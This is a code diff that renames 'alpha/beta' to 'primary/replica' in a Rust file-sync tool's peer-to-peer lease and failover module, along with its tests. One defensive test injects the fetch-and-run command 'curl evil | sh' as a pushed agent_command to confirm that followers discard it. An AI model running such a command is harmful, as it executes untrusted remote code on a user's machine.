@@ -1,6 +1,6 @@
-//! P2P: the state a host keeps so that a beta can take the lead.
+//! P2P: the state a host keeps so that a replica can take the lead.
 //!
-//! Experimental. A group in a p2p mode has one leader — the alpha,
+//! Experimental. A group in a p2p mode has one leader — the primary,
 //! until it is away long enough — and every other member follows. What
 //! makes a follower able to lead later is state the leader pushes to it
 //! on every cycle, all of it under `~/.autobahn/p2p/`:
@@ -58,8 +58,8 @@ const LOCK_FILE: &str = "lease.lock";
 /// controllers at one term is a split, and the second one is refused.
 #[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
 pub struct Lease {
-    /// Who leads: `"alpha"` for the configured alpha, otherwise the
-    /// leading beta's spec as the configuration writes it.
+    /// Who leads: `"primary"` for the configured primary, otherwise the
+    /// leading replica's spec as the configuration writes it.
     pub leader: String,
     /// The leadership's term. Every change of leader increases it.
     pub term: u64,
@@ -120,9 +120,9 @@ pub struct State {
     pub generation: Option<u64>,
 }
 
-/// The leader name the configured alpha writes into its leases. A beta
+/// The leader name the configured primary writes into its leases. A replica
 /// that leads writes its own spec instead.
-pub const ALPHA: &str = "alpha";
+pub const PRIMARY: &str = "primary";
 
 /// What a supervisor is, in a p2p group. Shared by every worker of
 /// the supervisor: a fence answered on one session steps the whole
@@ -156,7 +156,7 @@ impl Role {
     }
 }
 
-/// What a session presents to its beta on every cycle when its supervisor
+/// What a session presents to its replica on every cycle when its supervisor
 /// leads: the claim, with the lease lifetime the plan carries.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub struct Leadership {
@@ -179,7 +179,7 @@ impl Leadership {
 /// controller leads there. The worker steps the supervisor down on it.
 #[derive(Debug, thiserror::Error)]
 #[error(
-    "fenced: {} at term {} holds the lease on the beta; this supervisor stepped down",
+    "fenced: {} at term {} holds the lease on the replica; this supervisor stepped down",
     current.leader,
     current.term
 )]
@@ -188,25 +188,25 @@ pub struct Fenced {
     pub current: Lease,
 }
 
-/// The term a supervisor that is the configured alpha resumes at: the
-/// one in its own lease file when that names the alpha, and otherwise a
-/// fresh first term. A lease naming another leader means a beta led
+/// The term a supervisor that is the configured primary resumes at: the
+/// one in its own lease file when that names the primary, and otherwise a
+/// fresh first term. A lease naming another leader means a replica led
 /// while this machine was away, and this machine must not lead until
 /// that is settled — the caller decides what to do with that.
-pub fn alpha_term(directory: &Path) -> Result<AlphaStart> {
+pub fn primary_term(directory: &Path) -> Result<PrimaryStart> {
     match read_lease(directory)? {
-        None => Ok(AlphaStart::Lead { term: 1 }),
-        Some(lease) if lease.leader == ALPHA => Ok(AlphaStart::Lead { term: lease.term }),
-        Some(lease) => Ok(AlphaStart::Follow { lease }),
+        None => Ok(PrimaryStart::Lead { term: 1 }),
+        Some(lease) if lease.leader == PRIMARY => Ok(PrimaryStart::Lead { term: lease.term }),
+        Some(lease) => Ok(PrimaryStart::Follow { lease }),
     }
 }
 
-/// How the alpha starts.
+/// How the primary starts.
 #[derive(Clone, Debug, PartialEq, Eq)]
-pub enum AlphaStart {
+pub enum PrimaryStart {
     /// Lead, at this term.
     Lead { term: u64 },
-    /// Another member led while the alpha was away; follow it.
+    /// Another member led while the primary was away; follow it.
     Follow { lease: Lease },
 }
 
@@ -610,17 +610,17 @@ mod tests {
 
     #[test]
     fn a_lease_admits_a_higher_term_or_the_same_leader() {
-        let held = Lease::new("alpha", 7, Duration::from_secs(30));
-        assert!(held.admits(&Lease::new("alpha", 7, Duration::from_secs(30))));
+        let held = Lease::new("primary", 7, Duration::from_secs(30));
+        assert!(held.admits(&Lease::new("primary", 7, Duration::from_secs(30))));
         assert!(held.admits(&Lease::new("u@h:/x", 8, Duration::from_secs(30))));
         assert!(!held.admits(&Lease::new("u@h:/x", 7, Duration::from_secs(30))));
-        assert!(!held.admits(&Lease::new("alpha", 6, Duration::from_secs(30))));
+        assert!(!held.admits(&Lease::new("primary", 6, Duration::from_secs(30))));
     }
 
     #[test]
     fn staleness_is_judged_against_the_ttl() {
         let lease = Lease {
-            leader: "alpha".into(),
+            leader: "primary".into(),
             term: 1,
             renewed_at: 1_000,
             ttl_seconds: 30,
@@ -652,7 +652,7 @@ mod tests {
         let keep = tempfile::tempdir().expect("a temporary directory");
         let directory = keep.path().join(DIRECTORY);
         assert_eq!(read_lease(&directory).unwrap(), None);
-        let lease = Lease::new("alpha", 3, Duration::from_secs(30));
+        let lease = Lease::new("primary", 3, Duration::from_secs(30));
         write_lease(&directory, &lease).unwrap();
         assert_eq!(read_lease(&directory).unwrap(), Some(lease));
 
@@ -675,7 +675,7 @@ mod tests {
         let keep = tempfile::tempdir().expect("a temporary directory");
         let directory = keep.path().join(DIRECTORY);
         let ttl = Duration::from_secs(30);
-        admit_lease(&directory, &Lease::new(ALPHA, 1, ttl)).unwrap();
+        admit_lease(&directory, &Lease::new(PRIMARY, 1, ttl)).unwrap();
         for round in 2..40 {
             let barrier = std::sync::Barrier::new(2);
             let answers: Vec<(String, LeaseAnswer)> = std::thread::scope(|scope| {
@@ -714,7 +714,7 @@ mod tests {
             LeaseAnswer::Accepted
         );
         assert_eq!(
-            admit_lease(&directory, &Lease::new(ALPHA, 5, ttl)).unwrap(),
+            admit_lease(&directory, &Lease::new(PRIMARY, 5, ttl)).unwrap(),
             LeaseAnswer::Refused {
                 current: higher.clone()
             }
@@ -733,7 +733,7 @@ mod tests {
         assert_eq!(read_lease(&directory).unwrap(), None);
         admit_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap();
         assert!(renew_own_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap());
-        let next = Lease::new(ALPHA, 4, ttl);
+        let next = Lease::new(PRIMARY, 4, ttl);
         admit_lease(&directory, &next).unwrap();
         assert!(!renew_own_lease(&directory, &Lease::new("u@h:/x", 3, ttl)).unwrap());
         assert_eq!(read_lease(&directory).unwrap(), Some(next));
@@ -749,14 +749,14 @@ mod tests {
         let keep = tempfile::tempdir().expect("a temporary directory");
         let directory = keep.path().join(DIRECTORY);
         let ttl = Duration::from_secs(30);
-        let accepted = Lease::new(ALPHA, 5, ttl);
+        let accepted = Lease::new(PRIMARY, 5, ttl);
         admit_lease(&directory, &accepted).unwrap();
         drop(check_write(&directory, &accepted).expect("the lease holds"));
 
         // Lapsed: received 31 seconds ago on this host and never renewed,
         // though the leader's own clock says it renewed just now.
         let receipt = Receipt {
-            leader: ALPHA.into(),
+            leader: PRIMARY.into(),
             term: 5,
             received_at: now_seconds() - 31,
         };
@@ -797,7 +797,7 @@ mod tests {
         let keep = tempfile::tempdir().expect("a temporary directory");
         let directory = keep.path().join(DIRECTORY);
         let ttl = Duration::from_secs(30);
-        let accepted = Lease::new(ALPHA, 5, ttl);
+        let accepted = Lease::new(PRIMARY, 5, ttl);
         admit_lease(&directory, &accepted).unwrap();
         let guard = check_write(&directory, &accepted).unwrap();
         let admitted = std::sync::atomic::AtomicBool::new(false);
@@ -952,8 +952,8 @@ mod tests {
 
     /// Adoption takes the copy when it was written after the session's own
     /// store — the later agreement — whatever the generations say, and
-    /// reads either store journal and all. A copy that lagged when a beta
-    /// took over carries on below the generation the alpha reached before
+    /// reads either store journal and all. A copy that lagged when a replica
+    /// took over carries on below the generation the primary reached before
     /// it left; it is still the later record, and is adopted.
     #[test]
     fn adoption_takes_the_later_agreement() {
@@ -1018,7 +1018,7 @@ mod tests {
         std::fs::create_dir_all(copy.parent().unwrap()).unwrap();
         journal_only(&copy, 4);
         let own = state_root.join("sessions").join(&session).join("ancestor");
-        for writer in [None, Some(""), Some("other:/x"), Some(ALPHA)] {
+        for writer in [None, Some(""), Some("other:/x"), Some(PRIMARY)] {
             match adopt_as(state_root, &session, writer) {
                 Adoption::Refused(why) => assert!(why.contains("box:/x"), "{writer:?}: {why}"),
                 other => panic!("{writer:?}: {other:?}"),
@@ -1127,13 +1127,13 @@ mod tests {
 pub struct FollowerStar {
     /// This host's own spec, as the leader named it.
     pub name: String,
-    /// The plans this host runs when it leads: itself as the alpha, every
-    /// other beta as a beta. The configured alpha is not among them — it
+    /// The plans this host runs when it leads: itself as the primary, every
+    /// other replica as a replica. The configured primary is not among them — it
     /// is never dialed; it dials, and attaches (a later phase).
     pub plans: Vec<crate::config::SessionPlan>,
-    /// The position in the order of succession: the alpha is 0, the
-    /// first beta 1, and so on. A candidate at position *n* waits *n − 1*
-    /// extra lease lifetimes before it acts, so the first live beta acts
+    /// The position in the order of succession: the primary is 0, the
+    /// first replica 1, and so on. A candidate at position *n* waits *n − 1*
+    /// extra lease lifetimes before it acts, so the first live replica acts
     /// first without anyone being asked.
     pub position: usize,
     /// The heartbeat interval, from the plans.
@@ -1159,10 +1159,10 @@ pub fn pushed_configuration(directory: &Path) -> Result<Option<(String, String)>
 /// Derives a follower's star from the leader's configuration and the name
 /// the leader gave this host.
 ///
-/// The pushed configuration is the leader's star: a local alpha and remote
-/// betas, one of which is this host. Turned around, this host is the
-/// alpha — its own root, as a local path — and the other betas stay as
-/// they were. Groups not in a p2p mode are the alpha's business and
+/// The pushed configuration is the leader's star: a local primary and remote
+/// replicas, one of which is this host. Turned around, this host is the
+/// primary — its own root, as a local path — and the other replicas stay as
+/// they were. Groups not in a p2p mode are the primary's business and
 /// are dropped.
 ///
 /// This host's name is per group: two groups can reach it at two roots,
@@ -1175,15 +1175,15 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
     config.ignore_directory = Some(directory.join(crate::scan::ignorefile::DIRECTORY));
     let timing = config.p2p_plan()?;
 
-    // The name is matched against each beta entry as the leader would
+    // The name is matched against each replica entry as the leader would
     // have spelled it in full: an entry without a path inherits the
-    // alpha's, which is how the leader's plans named this host.
-    let full = |entry: &str, alpha: &str| -> String {
+    // primary's, which is how the leader's plans named this host.
+    let full = |entry: &str, primary: &str| -> String {
         let host_end = entry.find(':').unwrap_or(entry.len());
         if host_end < entry.len() {
             entry.to_owned()
         } else {
-            format!("{entry}:{alpha}")
+            format!("{entry}:{primary}")
         }
     };
     let host = match directory.parent() {
@@ -1210,9 +1210,9 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         };
         let name = name.as_str();
         let Some(index) = group
-            .betas
+            .replicas
             .iter()
-            .position(|entry| full(entry, &group.alpha) == name)
+            .position(|entry| full(entry, &group.primary) == name)
         else {
             continue;
         };
@@ -1225,24 +1225,28 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         // this host lets be synced is its own to say.
         host.check_root(&crate::paths::expand_tilde(&own_path)?)
             .with_context(|| format!("group {group_name}: the pushed name {name:?}"))?;
-        // The other betas as they were, and the configured alpha as a
-        // beta spec reached by attachment — so the star is never empty,
+        // The other replicas as they were, and the configured primary as a
+        // replica spec reached by attachment — so the star is never empty,
         // and the attached plan gets every setting the group carries.
         // Its sides are swapped back below.
-        let mut betas: Vec<String> = group
-            .betas
+        let mut replicas: Vec<String> = group
+            .replicas
             .iter()
             .enumerate()
             .filter(|(i, _)| *i != index)
-            .map(|(_, entry)| full(entry, &group.alpha))
+            .map(|(_, entry)| full(entry, &group.primary))
             .collect();
-        betas.push(format!("{}:{}", attached_destination(ALPHA), group.alpha));
-        // The command that reaches the other betas is this host's to
+        replicas.push(format!(
+            "{}:{}",
+            attached_destination(PRIMARY),
+            group.primary
+        ));
+        // The command that reaches the other replicas is this host's to
         // choose: a pushed one would run here at takeover, chosen by a
         // leader that may be long gone. Its own `host.toml` says, or ssh.
         let mut turned = crate::config::Group {
-            alpha: own_path,
-            betas,
+            primary: own_path,
+            replicas,
             agent_command: host.agent_command().map(str::to_owned),
             ..group.clone()
         };
@@ -1256,20 +1260,20 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         });
     }
     let (Some(position), Some(leader)) = (position, leader) else {
-        bail!("{name:?} is not a beta of any p2p group in the pushed configuration");
+        bail!("{name:?} is not a replica of any p2p group in the pushed configuration");
     };
     config.groups = groups;
     let planned = config
         .plans()
         .context("unable to plan the follower's star")?;
-    // The configured alpha's session: the alpha is reached by attachment,
+    // The configured primary's session: the primary is reached by attachment,
     // not dialed, and it keeps its side of the pair — so the session, and
     // the ancestor copy the leader pushed under its identifier, is the
     // same one the leader ran. Without a pushed identifier the session
     // has no known past, and it is left out rather than started afresh.
     let mut plans = Vec::with_capacity(planned.len());
     for plan in planned {
-        let attached = match &plan.beta {
+        let attached = match &plan.replica {
             crate::config::EndpointTarget::Remote {
                 destination, path, ..
             } if attached_name(destination).is_some() => Some(path.clone()),
@@ -1277,13 +1281,13 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
         };
         match attached {
             None => plans.push(plan),
-            Some(alpha_path) => {
+            Some(primary_path) => {
                 let pushed = read_pushed_file(directory, &format!("sessions/{}", plan.group))?;
                 let Some(identifier) = pushed else {
                     continue;
                 };
                 let identifier = String::from_utf8(identifier).context("the pushed session id")?;
-                plans.push(plan.attached_alpha(&alpha_path, identifier.trim().to_owned())?);
+                plans.push(plan.attached_primary(&primary_path, identifier.trim().to_owned())?);
             }
         }
     }
@@ -1303,7 +1307,7 @@ pub fn derive_star(configuration: &str, name: &str, directory: &Path) -> Result<
 
 /// How long a candidate at `position` waits past a stale lease before it
 /// acts: the configured wait, plus one lease lifetime for every member
-/// ahead of it in the order of succession other than the alpha.
+/// ahead of it in the order of succession other than the primary.
 pub fn takeover_wait(position: usize, timing: &crate::config::P2pPlan) -> Duration {
     let ahead = position.saturating_sub(1) as u32;
     timing.failover_after + timing.ttl.saturating_mul(ahead)
@@ -1322,13 +1326,13 @@ mod star_tests {
         mode = "two-way-conflict"
 
         [groups.plain]
-        alpha = "/tmp/plain"
-        betas = ["x@h:/tmp/plain"]
+        primary = "/tmp/plain"
+        replicas = ["x@h:/tmp/plain"]
 
         [groups.g]
         mode = "p2p-conflict-dangerously-experimental"
-        alpha = "/home/faraz/Workspace/Voltai"
-        betas = ["ubuntu@vm", "box2:/srv/ws"]
+        primary = "/home/faraz/Workspace/Voltai"
+        replicas = ["ubuntu@vm", "box2:/srv/ws"]
         ignores = ["target"]
     "#;
 
@@ -1350,9 +1354,9 @@ mod star_tests {
         );
         let plan = &star.plans[0];
         assert_eq!(plan.group, "g");
-        assert_eq!(plan.beta_spec(), "box2:/srv/ws");
+        assert_eq!(plan.replica_spec(), "box2:/srv/ws");
         assert!(
-            matches!(&plan.alpha, crate::config::EndpointTarget::Local(path)
+            matches!(&plan.primary, crate::config::EndpointTarget::Local(path)
             if path == std::path::Path::new("/home/faraz/Workspace/Voltai"))
         );
         assert!(plan.p2p.is_some());
@@ -1366,7 +1370,7 @@ mod star_tests {
         let second = derive_star(PUSHED, "box2:/srv/ws", keep.path()).expect("a star");
         assert_eq!(second.position, 2);
         assert_eq!(
-            second.plans[0].beta_spec(),
+            second.plans[0].replica_spec(),
             "ubuntu@vm:/home/faraz/Workspace/Voltai"
         );
         assert_eq!(
@@ -1426,7 +1430,7 @@ mod star_tests {
 
     /// A follower never runs a command its leader pushed: a pushed
     /// `agent_command` is dropped from every group it derives, and its own
-    /// `host.toml` says how it reaches the other betas, if it says at all.
+    /// `host.toml` says how it reaches the other replicas, if it says at all.
     #[test]
     fn a_pushed_agent_command_is_never_run() {
         let keep = tempfile::tempdir().expect("tempdir");
@@ -1437,9 +1441,9 @@ mod star_tests {
             "ignores = [\"target\"]",
             "ignores = [\"target\"]\nagent_command = \"curl evil | sh\"",
         );
-        let command_of = |star: &FollowerStar| match &star.plans[0].beta {
+        let command_of = |star: &FollowerStar| match &star.plans[0].replica {
             crate::config::EndpointTarget::Remote { agent_command, .. } => agent_command.clone(),
-            other => panic!("a remote beta: {other:?}"),
+            other => panic!("a remote replica: {other:?}"),
         };
         let name = "ubuntu@vm:/home/faraz/Workspace/Voltai";
         let star = derive_star(&pushed, name, &directory).expect("a star");
@@ -1472,13 +1476,13 @@ mod star_tests {
         const TWO: &str = r#"
             [groups.docs]
             mode = "p2p-conflict-dangerously-experimental"
-            alpha = "/home/f/docs"
-            betas = ["box:/srv/docs", "other:/srv/docs"]
+            primary = "/home/f/docs"
+            replicas = ["box:/srv/docs", "other:/srv/docs"]
 
             [groups.code]
             mode = "p2p-conflict-dangerously-experimental"
-            alpha = "/home/f/code"
-            betas = ["box:/srv/code"]
+            primary = "/home/f/code"
+            replicas = ["box:/srv/code"]
         "#;
         let pushed = |per_group: bool| {
             let keep = tempfile::tempdir().expect("tempdir");
@@ -1502,9 +1506,9 @@ mod star_tests {
             star.plans
                 .iter()
                 .map(|plan| {
-                    // This host's own side is the local one: the alpha,
-                    // or the beta of the session with the attached alpha.
-                    let root = match (&plan.alpha, &plan.beta) {
+                    // This host's own side is the local one: the primary,
+                    // or the replica of the session with the attached primary.
+                    let root = match (&plan.primary, &plan.replica) {
                         (crate::config::EndpointTarget::Local(root), _)
                         | (_, crate::config::EndpointTarget::Local(root)) => root,
                         _ => panic!("no side of {plan:?} is this host"),
@@ -1542,10 +1546,10 @@ mod star_tests {
 }
 
 /// The host part of an endpoint reached by an attachment rather than by
-/// dialing: the configured alpha, from a beta that leads. The destination
+/// dialing: the configured primary, from a replica that leads. The destination
 /// is `<name>@attached` — the user-at-host shape a spec already allows,
 /// with no colon in it, so `<name>@attached:<path>` parses as any remote
-/// spec does. The name is `alpha`, the one member that dials in.
+/// spec does. The name is `primary`, the one member that dials in.
 pub const ATTACHED_HOST: &str = "attached";
 
 /// The destination for an attached peer.
@@ -1559,24 +1563,24 @@ pub fn attached_name(destination: &str) -> Option<&str> {
 }
 
 /// Which side of a session is the peer — the host the lease, the
-/// records and the files go to. The beta, except for a session a beta
-/// runs against the attached alpha.
+/// records and the files go to. The replica, except for a session a replica
+/// runs against the attached primary.
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum PeerSide {
-    Alpha,
-    Beta,
+    Primary,
+    Replica,
 }
 
 /// The name of the attach socket in a leading peer's directory.
 pub const ATTACH_SOCKET: &str = "attach.sock";
 
-/// The environment variable that replaces the command the alpha runs to
+/// The environment variable that replaces the command the primary runs to
 /// attach to a leader: an argv, whitespace-split, with `{destination}`
 /// standing for the leader's SSH destination. For tests, and for
 /// transports other than SSH.
 pub const ATTACH_COMMAND_VARIABLE: &str = "AUTOBAHN_P2P_ATTACH";
 
-/// The command the alpha runs to attach to the leader at `destination`:
+/// The command the primary runs to attach to the leader at `destination`:
 /// `ssh <destination> autobahn p2p attach`, unless the environment
 /// says otherwise.
 pub fn attach_argv(destination: &str) -> Vec<String> {
@@ -1615,13 +1619,13 @@ pub enum Adoption {
 
 /// Brings a session's ancestor level with the copy a leader pushed here,
 /// when the copy is newer and can be trusted as far as this host can tell.
-/// A beta that starts to lead seeds its sessions this way; an alpha that
-/// gets the lead back adopts what the beta recorded meanwhile.
+/// A replica that starts to lead seeds its sessions this way; a primary that
+/// gets the lead back adopts what the replica recorded meanwhile.
 ///
 /// Newer means written later, not a higher generation. Each store records
 /// the last state its session agreed on, and the later agreement is the
 /// one to continue from. Generations cannot say which that is once the
-/// two histories have parted: a copy that lagged when a beta took over
+/// two histories have parted: a copy that lagged when a replica took over
 /// carries on from where it lagged, and a history that was reset counts
 /// from one again, so either can be the later record at the lower
 /// number. The times are comparable because both stores are on this host
